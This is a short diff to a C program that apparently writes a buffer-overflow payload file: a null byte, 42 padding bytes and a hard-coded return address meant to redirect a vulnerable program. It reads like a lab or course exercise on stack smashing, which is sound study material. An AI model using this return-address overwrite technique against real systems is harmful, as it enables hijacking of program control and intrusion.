@@ -18,10 +18,10 @@ int main(void) {
     putc('\0', psFile);
 
     for (i = 0; i < 42; i++) {
-        fprintf(psFile, "%c", i);
+        fprintf(psFile, "%c", 'a');
     }
    
-    ulAddress = 0x400878;
+    ulAddress = 0x0000000000400858;
 
     fwrite(&ulAddress, sizeof(unsigned long), 1, psFile);
     fclose(psFile);
